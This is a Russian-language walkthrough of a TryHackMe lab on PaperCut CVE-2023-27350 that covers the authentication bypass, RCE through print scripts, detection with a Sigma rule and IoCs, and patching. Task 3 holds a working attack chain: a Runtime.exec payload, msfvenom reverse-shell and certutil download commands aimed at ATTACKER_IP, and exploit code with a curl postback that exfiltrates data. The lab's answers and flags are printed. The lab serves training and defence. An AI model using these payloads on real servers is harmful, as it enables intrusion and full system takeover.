[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [PaperCut: CVE-2023-27350](https://tryhackme.com/r/room/papercut) 

Всего 5 заданий:
## Задание 1
8 марта 2023 года был выпущен патч для CVE -2023-27350. В CVE описывается обход аутентификации в приложении 
PaperCut NG/MF, веб-программном обеспечении, используемом корпоративными организациями для управления принтерами и 
процессами печати. Уязвимость позволяет любому субъекту угроз удаленно получить доступ администратора к 
веб-приложению и злоупотребить законной функциональностью скриптов в приложении для удаленного выполнения кода от 
имени SYSTEM на сервере.

Проблема, однако, заключалась в том, что в последующие месяцы активная эксплуатация этой проблемы была замечена в 
дикой природе. Также наблюдался устойчивый рост эксплуатации, включая доставку вредоносного ПО с помощью фреймворков 
C2, таких как CobaltStrike и даже программ-вымогателей! Группы, стоящие за активной эксплуатацией, включают 
известные Advance Persistent Threats (APT), такие как группа программ-вымогателей Cl0p.


Эксплуатация показала такой значительный рост, потому что это эксплойт с нулевым щелчком. Он может быть полностью 
написан для автоматизированной доставки вредоносного ПО, если целевая система уязвима. В этой комнате мы объясним 
уязвимость, покажем, как ее можно эксплуатировать, как от нее можно защититься, и основополагающий принцип 
безопасности, который эта проблема снова подняла, что правильная очистка после установки имеет жизненно важное 
значение!

Запуск виртуальной машины

Чтобы развернуть присоединенную виртуальную машину , нажмите зеленую кнопку Start Machine в верхней части задачи. 
Загрузка машины займет около 5 минут. Запишите MACHINE_IP, так как это будет IP-адрес вашей уязвимой машины.

Чтобы атаковать эту цель, вы можете использовать AttackBox, нажав кнопку Start AttackBox , или использовать 
собственную атакующую машину, подключившись к TryHackMe VPN. Вы можете проверить, что ваша уязвимая машина 
загрузилась, перейдя по адресу http://MACHINE_IP:9191.

### Ответьте на вопросы ниже
Я готов узнать о CVE-2023-27350!

```commandline
Ответ не нужен
```

## Задание 2
#### PaperCut

PaperCut — это популярное программное обеспечение для управления печатью, которое организации используют по всему 
миру для управления услугами печати и копирования. В рамках своего набора продуктов PaperCut предлагает два похожих 
варианта с самостоятельным размещением:

- PaperCut NG — решение для управления и контроля печати
- PaperCut MF — аналог NG, но с расширенными функциями копирования и сканирования.
Компания PaperCut объявила, что неисправленные серверы MF и NG подвергаются атакам мошенников, поскольку они 
  подвержены уязвимости обхода аутентификации, описанной ниже.

#### CVE -2023-27350

Zero Day Initiative ZDI-23-233 описывает CVE -2023-27350 как уязвимость, позволяющую неаутентифицированному 
удаленному злоумышленнику получить удаленное выполнение кода и скомпрометировать уязвимый сервер приложений PaperCut.
Эта CVE также напрямую связана с CVE -2023–27351, которая, используя ту же уязвимость, описанную ниже, позволяет 
неаутентифицированному злоумышленнику извлекать информацию (имена пользователей, адреса электронной почты и хэши 
паролей) пользователей, хранящуюся в PaperCut.

Эта уязвимость двойная и изначально проистекает из уязвимости обхода аутентификации. Она позволяет 
неаутентифицированному удаленному злоумышленнику обойти страницу входа и получить административный доступ к консоли 
PaperCut, просто запросив URL, который изначально использовался во время процесса установки приложения.

Затем этот запрос инициирует SetupCompleted класс, который, как видно из приведенного ниже блока кода, включает вызов 
метода performLogin()Java, передавая его Adminв качестве LoginType аргумента.

homePage.performLogin(setupData.getAdminUserName(), LoginType.Admin, false);
Приложение обычно вызывает эту функцию только после того, как пользователь прошел проверку во время обычного 
процесса входа в систему. Однако в этом случае в классе есть ошибка Session PuzzlingSetupCompleted — логическая 
уязвимость, которая возникает, когда функции сеанса и аутентификации используются для нескольких целей. Используя 
эту ошибку, приложение ошибочно проверяет сеанс администратора для неаутентифицированного пользователя.

Чтобы узнать больше об уязвимостях обхода аутентификации, посетите комнату Обход аутентификации !

Этот обход аутентификации приводит к удаленному выполнению кода путем злоупотребления встроенной функциональностью 
«скриптинга» консоли администратора. При использовании злоумышленник может вставить произвольный JavaScript в скрипт 
шаблона печати. Отключение параметра конфигурации песочницы предоставляет скриптам принтера прямой доступ к среде 
выполнения Java, что позволяет выполнять произвольный код. Код может быть выполнен по требованию путем сохранения 
скрипта. Таким образом, простое редактирование скрипта может разрешить удаленное выполнение кода.    

Чтобы усилить серьезность этой проблемы, выполняемые скрипты запускаются в контексте службы PrintCut, которая, в 
свою очередь, выполняется как полностью привилегированная NT AUTHORITY\SYSTEMучетная запись в установках Windows 
(или rootучетная запись в Linux ). Таким образом, злоупотребление этой функциональностью дает ранее 
неаутентифицированному субъекту угрозы полные привилегии над хостом!

#### Влияние

Серьезность CVE -2023-27350 была очевидна из-за многочисленных случаев активной эксплуатации со стороны 
злоумышленников, которые использовали ее для проникновения в целевые системы со злым умыслом. Из-за ее простой 
природы злоумышленникам несложно автоматизировать всю атаку. После выпуска публичного эксплойта PoC исследователи 
угроз наблюдали, как несколько групп нацелились на уязвимые серверы по всему миру, причем большой процент из них был 
нацелен на образовательный сектор. Как видно из приведенной ниже временной шкалы, группы, стоящие за активной 
эксплуатацией, включают известную группу вымогателей Cl0p.

Поиск на Shodan в апреле 2023 года выявил около 1700 серверов PaperCut, доступных через Интернет. Как упоминалось 
ранее, PaperCut — это широко используемое программное решение с более чем 100 миллионами пользователей из 70 000 
организаций по всему миру, что является сильным мотиватором для широкого круга субъектов угроз.

Что касается полезных нагрузок, Sophos наблюдал злоупотребление многими законными инструментами, обычно 
используемыми ИТ-персоналом, такими как AnyDesk , Atera , Synchro , TightVNC , NetSupport и DWAgent, в ходе 
многочисленных кампаний. Кроме того, злоумышленники также продолжают использовать Truebot (загрузчик вредоносного ПО)
, Buhtiransom (программу-вымогатель), Mirai (ботнет) и майнеры монет на скомпрометированных системах.

Приведенный ниже график, упрощенный на основе данных Sophos, предлагает первоначальную хронологию наиболее значимых 
событий, связанных с PaperCut, по мере их развития:

Временная шкала, показывающая артефакты, связанные с PaperCut, с 13 апреля 2023 года по 25 апреля 2023 года. К 
примечательным событиям относятся первый инцидент, приписываемый Cl0p, первый PoC и свидетельства загрузок 
криптомайнеров, Cobalt Strike, Buhtiransom, удаленных оболочек и загрузок PowerShell.

### Ответьте на вопросы ниже
Как называется логическая уязвимость, которая возникает, когда функции сеанса и аутентификации используются для 
нескольких целей? 
```commandline
Session Puzzling
```
Как называется класс Java, содержащий уязвимость обхода аутентификации?
```commandline
SetupCompleted
```

## Задание 3
Давайте рассмотрим, что требуется для эксплуатации уязвимости. Мы воспользуемся обходом аутентификации и сделаем шаг 
вперед, используя функциональность скриптов для удаленного выполнения кода!

Обход аутентификации

Сама уязвимость невероятно тривиальна и встречается довольно часто. Когда приложение установлено, начальная 
конфигурация позволяет пользователю обойти этап аутентификации или аутентифицироваться с учетными данными по 
умолчанию. Вот почему это все еще очень популярная атака на угадывание admin:admin(или любой другой эквивалент) в 
любом веб-приложении. Если учетные данные по умолчанию не были изменены, это предоставит вам доступ. Вот несколько 
очень известных примеров:

- Apache Tomcat — аутентификация с помощью tomcat:s3cr3t
- Jenkins — Аутентификация с помощью jenkins:jenkins
- Почти любой WiFi-маршрутизатор — аутентификация с помощью admin:admin
Это настолько популярная атака, что эксплуатация этой уязвимости привела к созданию ботнета Marai!

Для борьбы с этим известным вектором атак веб-приложения обычно избегают внедрения учетных данных по умолчанию. Это 
делается путем принуждения пользователя к смене пароля при первой попытке аутентификации или путем генерации 
случайного пароля. Однако затем это создало возможность для новой уязвимости, как это видно в случае с 
CVE-2023-27350. Если файлы настройки не будут удалены должным образом, злоумышленник может воспользоваться этим, 
чтобы попросить процесс настройки «перезапустить» первоначальный процесс аутентификации и предоставить доступ.

Давайте рассмотрим, как это можно использовать в приложении PaperCut. Перейдите по адресу http://MACHINE_IP:9191и вы 
увидите следующую страницу входа:

Страница входа на веб-сервер PaperCut

Хотя вы можете попробовать атаку подбора пароля, эта уязвимость упрощает ее! Все, что вам нужно сделать, чтобы 
воспользоваться этой уязвимостью, это перейти на http://MACHINE_IP:9191/app?service=page/SetupCompleted, где вы 
увидите следующую страницу:

Настройка PaperCutПолная страница входа

Нажав кнопку «Войти» , вы будете аутентифицированы в приложении!

Панель управления веб-сервера PaperCut

Это так просто. Как упоминалось ранее, основная проблема возникает из-за файлов установки и настройки, сохраняющихся 
в приложении после первоначальной конфигурации. Поскольку страница SetupCompleted отвечает за создание вашего нового 
сеанса, но ожидает, что вы уже аутентифицированы, мы можем полностью обойти аутентификацию, просто перейдя на 
страницу и нажав кнопку Login , которая генерирует для нас активный токен сеанса!

Удаленное выполнение кода

Получение административного доступа к веб-приложению само по себе вызывает беспокойство, поскольку это может 
позволить злоумышленнику прочитать и изменить конфиденциальную информацию. Однако ситуация ухудшается, поскольку 
легитимная функциональность часто может быть использована для удаленного выполнения кода на сервере.

Выполнение кода как функция — это горячо обсуждаемая тема. Большинство специалистов по безопасности считают, что в 
большинстве случаев должен быть лучший способ реализовать функциональность, чем выполнение прямых команд 
операционной системы. Однако простой факт заключается в том, что в некоторых случаях этого нельзя избежать. DevOps — 
это выполнение кода как функция, если вы задумаетесь об этом. Таким образом, в большинстве случаев это не 
рассматривается как уязвимость. Поэтому жизненно важно защитить доступ к этим системам, чтобы гарантировать, что 
субъект угрозы не сможет злоупотребить ими.

Функция, о которой идет речь, которую можно использовать в приложении PaperCut для удаленного выполнения кода, — это 
диспетчер скриптов для принтеров. Вы можете перейти к этому разделу следующим образом:

Нажмите «Принтеры» .
Нажмите [Шаблон принтера] .
Нажмите «Сценарии» .
Установите флажок Включить сценарий печати .
Вы должны увидеть следующую страницу:

Вкладка расширенных сценариев на странице сведений о принтере.

Поскольку скрипты выполняются через JavaScript, для выполнения кода мы можем просто использовать exec()функцию Java 
для выполнения нашего кода. Поэтому мы можем изменить код следующим образом.

Сценарий
```
//
// Customize your print process with Print Scripting.  You don't have to be a
// programmer to use Print Scripting.  Use one of the many pre-written recipes
// already written for you, or write your own in JavaScript using snippets and
// reference documentation.
//
function printJobHook(inputs, actions) {
	// your script here
}
java.lang.Runtime.getRuntime().exec('ping.exe ATTACKER_IP');

```
Примечание: обязательно измените ATTACKER_IP на IP-адрес вашего AttackBox.

Хотя мы можем добавить любую команду, мы начнем с простой команды ping, чтобы убедиться, что сервер может 
подключиться к нам. Чтобы захватить трафик, давайте запустим TCPDUMP в терминале с помощью tcpdump -i ens5 icmp. 
Если вы не используете AttackBox, ens5необходимо изменить на ваш VPN- адаптер, который в большинстве случаев будет 
tun0. Вы должны увидеть следующее:

Терминал
```commandline
root@ip-10-10-148-236:~# tcpdump -i ens5 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens5, link-type EN10MB (Ethernet), capture size 262144 bytes
19:33:44.102431 IP ip-10-10-100-120 > ip-10-10-148-236: ICMP echo request, id 1, seq 1, length 40
19:33:44.102477 IP ip-10-10-148-236 > ip-10-10-100-120: ICMP echo reply, id 1, seq 1, length 40
19:33:45.107816 IP ip-10-10-100-120 > ip-10-10-148-236: ICMP echo request, id 1, seq 2, length 40
19:33:45.107906 IP ip-10-10-148-236 > ip-10-10-100-120: ICMP echo reply, id 1, seq 2, length 40
19:33:46.123652 IP ip-10-10-100-120 > ip-10-10-148-236: ICMP echo request, id 1, seq 3, length 40
19:33:46.123722 IP ip-10-10-148-236 > ip-10-10-100-120: ICMP echo reply, id 1, seq 3, length 40
19:33:47.139443 IP ip-10-10-100-120 > ip-10-10-148-236: ICMP echo request, id 1, seq 4, length 40
19:33:47.139472 IP ip-10-10-148-236 > ip-10-10-100-120: ICMP echo reply, id 1, seq 4, length 40
```
Это показывает, что выполнение нашего кода работает! Если вы хотите проверить себя, вы можете попытаться 
эксплуатировать хост вручную и пропустить следующий раздел. Однако, если вы хотите увидеть, как мы будем 
эксплуатировать проблему с помощью общедоступного эксплойта, вы можете следовать за нами!

Собираем все вместе

Теперь, когда мы понимаем и обход аутентификации, и удаленное выполнение кода, мы можем объединить это, чтобы 
получить оболочку на хосте. Если вы не знакомы с использованием таких инструментов, как Metasploit , рекомендуется 
сначала завершить этот модуль. Для этого шага мы будем использовать общедоступный эксплойт от Horizon3AI , который 
можно загрузить из этого репозитория . Запустите  , чтобы загрузить эксплойт.git clone https://github.com/horizon3ai/CVE-2023-27350

Чтобы получить обратную оболочку, нам придется сгенерировать исполняемый файл meterpreter. Для этого шага мы будем 
использовать MSFVenom:

Терминал
```commandline
msfvenom -p windows/shell/reverse_tcp -f exe LHOST=ATTACKER_IP LPORT=4444 -o shell.exe

```
Нам нужно будет разместить этот исполняемый файл, чтобы сервер мог его загрузить. Для этого мы можем использовать HTTP- сервер Python :
Терминал
```commandline
python3 -m http.server 8080
```
Наконец, нам нужно настроить наш прослушиватель в новом окне терминала:
Терминал
```commandline
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/shell/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; exploit"
```
Теперь, когда у нас все настроено, мы готовы к работе. Мы выполним две команды, используя эксплойт Python. Первая 
команда загрузит наш исполняемый файл, а вторая выполнит его. В новом окне терминала мы используем Certutil для 
загрузки нашей оболочки:

Терминал
```commandline
python3 CVE-2023-27350.py -u http://MACHINE_IP:9191 -c "certutil.exe -urlcache -f http://ATTACKER_IP:8080/shell.exe shell.exe"
```
Вы должны увидеть запрос на загрузку на вашем Python HTTP Server. Далее мы можем использовать cmd для запуска нашей 
оболочки:

Терминал
```commandline
python3 CVE-2023-27350.py -u http://MACHINE_IP:9191 -c "cmd.exe /c shell.exe"
```
После выполнения второй команды проверьте работу своего слушателя, и у вас должна появиться оболочка:

Терминал
```commandline
[*] Command shell session 1 opened (10.10.148.236:4444 -> 10.10.100.120:49982) at 2023-07-19 19:58:32 +0100


Shell Banner:
Microsoft Windows [Version 10.0.17763.1821]
-----
          

C:\Program Files\PaperCut NG\server>
C:\Program Files\PaperCut NG\server>whoami
whoami
nt authority\system

C:\Program Files\PaperCut NG\server>
```
Поскольку служба PaperCut работает как SYSTEM, нет даже необходимости выполнять повышение привилегий! Теперь у нас 
есть самый высокий уровень контроля над этим сервером.

Понимание автоматизированного эксплойта

Автоматизированный скрипт эксплойта, который мы используем, выполняет те же шаги, что и наша ручная эксплуатация. 
Ключевые шаги и связанный с ними код объясняются ниже.

Выполнение обхода аутентификации

Первая часть скрипта выполняет обход аутентификации, используя requests библиотеку Python для перехода на уязвимую 
страницу SetupCompleted:

CVE-2023-27350.py
```commandline
def get_session_id(base_url):
    s = requests.Session()
    r = s.get(f'{base_url}/app?service=page/SetupCompleted', verify=False)
```
Получение сеанса администратора

После загрузки страницы код выполняет POST запрос к указанной цели для восстановления токена сеанса администратора (JSESSIONID):

CVE-2023-27350.py
```commandline
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'direct/1/SetupCompleted/$Form',
        'sp': 'S0',
        'Form0': '$Hidden,analyticsEnabled,$Submit',
        '$Hidden': 'true',
        '$Submit': 'Login'
    }
    r = s.post(f'{base_url}/app', data=data, headers=headers, verify=False)
    if r.status_code == 200 and b'papercut' in r.content and 'JSESSIONID' in r.headers.get('Set-Cookie', ''):

```
Переход к диспетчеру сценариев принтера

Используя активный сеанс, эксплойт выполняет серию HTTP- GET запросов для перехода к диспетчеру скриптов принтера. 
По умолчанию выбирается первый принтер в списке:

CVE-2023-27350.py
```commandline
def execute(base_url, session, command):
    print('[*] Prepparing to execute...')
    postback = "java.lang.Runtime.getRuntime().exec('cmd.exe /C \"for /F \"usebackq delims=\" %A in (`whoami`) do curl http://10.0.40.83:8081/%A\"');"
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'page/PrinterList'
    }
    r = session.get(f'{base_url}/app?service=page/PrinterList', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/PrinterList/selectPrinter',
        'sp': 'l1001'
    }
    r = session.get(f'{base_url}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/PrinterDetails/printerOptionsTab.tab',
        'sp': '4'
    }
    r = session.get(f'{base_url}/app', data=data, headers=headers, verify=False)

```
Внедрение выполнения кода

Чтобы выполнить предоставленную команду, эксплойт должен обновить и выполнить скрипт. Это должно быть сделано с 
помощью отправки многокомпонентной формы, как показано ниже:

CVE-2023-27350.py
```commandline
data = {
        'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
        'sp': 'S0',
        'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
        'printerId': 'l1001',
        'enablePrintScript': 'on',
        'scriptBody': "function printJobHook(inputs, actions) {}\r\n" \
                     f"java.lang.Runtime.getRuntime().exec('{command}');",
        '$Submit$1': 'Apply',
    }
    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
```
Проверка эксплуатации

Последний шаг — проверка того, что эксплуатация сработала как ожидалось. Это делается путем определения того, 
отображается ли в ответе сообщение «Сохранено успешно»:

CVE-2023-27350.py
```commandline
if r.status_code == 200 and 'Saved successfully' in r.text:
        print('[+] Executed successfully!')
    else:
        print('[-] Might not have a printer configured. Exploit manually by adding one.')
```

### Ответьте на вопросы ниже
Если уязвимый хост имеет имя хоста PRINT.TRYHACKME.LOC, какой URL-адрес можно использовать для обхода аутентификации?
```commandline
http://PRINT.TRYHACKME.LOC:9191/app?service=page/SetupCompleted
```
Какую одностроковку следует добавить в диспетчер скриптов для запуска calc.exe?
```commandline
java.lang.Runtime.getRuntime().exec('calc.exe');
```
Какое значение флага хранится в папке «Рабочий стол администратора»?
```commandline
THM{PaperCuts.Can.Hurt.Even.Computers}
```
Какой текст ищет автоматизированный эксплойт, чтобы узнать, что эксплойт прошел успешно?
```commandline
Saved successfully
```

## Задание 4
Обнаружение

Прежде чем погрузиться в обнаружение и смягчение последствий, опубликованные в сети, давайте выясним, какая информация о журналах приложений у нас есть, которая предоставит нам информацию об атаке. После завершения полного пути эксплойта перейдите к функции Logs в приложении PaperCut и выберите Application Log . Вы увидите следующее:

Данные журнала приложения PaperCut, указывающие на то, что администратором было выполнено несколько действий

Как вы можете видеть на изображении, атака относительно шумная, только в журналах приложений. Только из этих журналов мы можем увидеть IP, с которого произошла аутентификация как администратора, и изменение скрипта печати. ​​Наряду с этим, есть несколько ключевых областей, на которых защитники должны сосредоточить свои усилия по обнаружению:

Сигнатуры сетевого трафика
Системный мониторинг
Настройки сервера и файлы журналов
Сигнатуры сетевого трафика

Как было описано ранее, для эксплуатации CVE -2023-27350 злоумышленнику необходимо изначально получить доступ к /app?service=page/SetupCompletedпути сервера PaperCut, что позволит ему обойти поток аутентификации. Таким образом, обнаружение того, что GETзапрос на эту страницу был сделан вне каких-либо известных процедур установки или обновления на сервере PaperCut, явно указывает на подозрительную активность.

Кроме того, PaperCut предоставил список известных вредоносных доменов, связанных с эксплойтом PaperCut in wild. Если контакт с любым из этих доменов обнаружен в системе доменных имен ( DNS ) или журналах веб-прокси, это считается еще одним индикатором компрометации, побуждающим к расследованию:

Нажмите, чтобы развернуть IoC сетевого трафика.

Системный мониторинг

Когда программное обеспечение PaperCut используется для выполнения другого процесса, в pc-app.exe. Таким образом, подозрительные пути родительско-дочерних процессов сравнительно легко обнаружить. Например, если процесс PaperCut внезапно начинает генерировать powershell.exeили cmd.exeдочерние процессы, это может быть признаком того, что происходит что-то подозрительное.

Диаграмма, показывающая возникновение вредоносных исполняемых файлов командной строки из родительского процесса Papercut

Sigma — это универсальный язык сигнатур, который используется для написания правил обнаружения на основе шаблонов, найденных в журналах событий. Чтобы узнать больше о правилах Sigma, посетите эту вводную комнату на Sigma . Следующее правило Sigma, разработанное Huntress Labs , может использоваться для обнаружения подозрительного выполнения кода с уязвимых серверов PaperCut:

win_susp_papercut_code_execution.yml
title: PaperCut MF/NG Vulnerability
authors: Huntress DE&TH Team
description: Detects suspicious code execution from vulnerable PaperCut versions MF and NG
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: "\\pc-app.exe"
    Image|endswith: 
      - "\\cmd.exe"
      - "\\powershell.exe"
  condition: selection
level: high
falsepositives:
    - Expected admin activity
Подводя итог, это правило обнаруживает подозрительное выполнение кода, ища процессы, где pc-app.exeявляется родительским процессом, а текущий процесс — это cmd.exeили powershell.exe.

Важно отметить, что злоумышленники могут обойти указанное выше правило, используя исполняемые файлы living-off-the-land (LOLBins) или порождая дополнительные дочерние процессы между PaperCut и исполняемым файлом командной строки. В связи с этим становится все более важным устранить уязвимость, обновив PaperCut до исправленной версии, как описано в разделе «Смягчение» ниже .

Следующие хеши SHA256 файлов в локальной системе также можно использовать для поиска угроз, поскольку они известны как хеши, связанные с эксплойтами PaperCut в реальной жизни:

хэши.txt
setup.msi: f9947c5763542b3119788923977153ff8ca807a2e535e6ab28fc42641983aabb
ld.txt: c0f8aeeb2d11c6e751ee87c40ee609aceb1c1036706a5af0d3d78738b6cc4125
setup.msi- Это связанный хэш установочного пакета для легитимного программного обеспечения Atera remote management and maintenance (RMM). Были обнаружены злоумышленники, использующие этот установщик для получения постоянного удаленного доступа и контроля над уязвимыми серверами PaperCut.
ld.txt- Это связанный хэш вредоносной библиотеки Truebot Windows DLL , которая использовалась злоумышленниками для эксплуатации уязвимых серверов PaperCut.
Настройки сервера и файлы журналов

Если сервер PaperCut настроен на вход в режиме отладки , можно обнаружить подозрительную активность, выполнив поиск строк, содержащих данные, SetupCompletedкоторые не связаны ни с одной известной установкой или обновлением сервера. Кроме того, журналы сервера можно найти в [app-path]/server/logs/*.*, server.logобычно это самый последний файл журнала. Обнаружение записей журнала, относящихся к следующему, может быть признаком компрометации и потребовать дальнейшего расследования:

Пользователь «admin» обновил ключ конфигурации «print.script.sandboxed»
Пользователь «admin» обновил ключ конфигурации «device.script.sandboxed»
Пользователь «admin» обновил ключ конфигурации «print-and-device.script.enabled»
Пользователь-администратор «admin» изменил сценарий печати на принтере.
Настройки синхронизации пользователей/групп изменены пользователем «admin»
Смягчение

Продемонстрированная уязвимость была исправлена ​​в версиях 20.1.7, 21.2.11 и 22.0.9 . Поэтому настоятельно рекомендуется обновить сервер PaperCut до исправленной версии, используя рекомендации по исправлению, указанные в рекомендациях PaperCut .

Страница «Проверка наличия обновлений» (доступ к которой осуществляется через интерфейс администратора > О программе > Информация о версии > Проверить наличие обновлений ) позволит вам загрузить исправления для предыдущих основных версий, которые все еще поддерживаются (20.1.7 и 21.2.11), а также для текущей доступной версии.

Панель администратора PaperCut, выделенная кнопка «Проверить наличие обновлений»

Кроме того, здесь можно напрямую получить доступ к последним версиям PaperCut NG и PaperCut MF .

Если вы не можете немедленно установить исправление, есть несколько вариантов, которые вы можете выполнить, чтобы заблокировать доступ к сети и добиться частичного смягчения последствий:

Заблокируйте весь входящий трафик с внешних IP-адресов на порт веб-управления (порты 9191 и 9192 по умолчанию). Это не уменьшит риск эксплуатации уязвимости, если злоумышленник сумел получить доступ к локальной сети и совершил боковой поворот.
Заблокируйте весь входящий трафик на портал веб-управления на брандмауэре на сервере . Этот метод предотвратит боковое перемещение и поворот с внутренних хостов, но также предотвратит управление службой PaperCut из любого другого места, кроме самого сервера.
Сценарий обнаружения

Пришло время исследовать реальный сценарий с использованием вышеупомянутых методов! Обязательно нажмите кнопку Start Machine в верхней части этой задачи, и веб-сайт будет инициализирован в режиме разделенного экрана. Примечание: может потребоваться несколько минут, чтобы стать доступным. При необходимости вы можете обновить встроенный браузер, нажав на его имя рядом с «Информацией о машине». Если виртуальная машина не отображается, используйте синюю кнопку Show Split View в верхней части страницы.

### Ответьте на вопросы ниже
Исходя из журналов приложений на первом изображении, как называется принтер, для которого был обновлен «скрипт печати»?
```commandline
[Template printer]
```
Каково имя исполняемого файла процесса PaperCut в Windows?
```commandline
pc-app.exe
```
Какой флаг вы получаете после обнаружения индикаторов компрометации в сети Inktrail?
```commandline
THM{PAPER.JAM.DETECTED}
```

## Задание 5
В этой комнате мы показали, как легко эксплуатировать уязвимость обхода аутентификации PaperCut и злоупотреблять 
функциональностью скриптов для удаленного выполнения кода. Стоит отметить, что поскольку удаленное выполнение кода 
происходит через легитимную функцию, даже если вы исправили эту уязвимость, злоумышленники все равно могут 
воспользоваться этим, если вы настроили слабый пароль в приложении. Таким образом, это приводит к двум основным урокам:

- Для разработчиков - Убедитесь, что вы выполнили достаточную очистку установочных и настроечных файлов после 
процесса. Часто обходы, встроенные в эти файлы, которые завершают установку, могут быть использованы 
  злоумышленниками, если их не удалить. 
- Для пользователей - Часто приложения имеют мощный функционал, который работает в привилегированных контекстах. 
  Чтобы защитить этот функционал, убедитесь, что ваше программное обеспечение обновлено, и используйте надежные 
  пароли для интерфейсов администрирования. 
Своевременное обновление программного обеспечения и использование надежных паролей значительно повысят вашу безопасность!

### Ответьте на вопросы ниже
Я понимаю свою уязвимость, понимаю, как легко совершить эту ошибку, и как лучше защитить себя в будущем!

```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)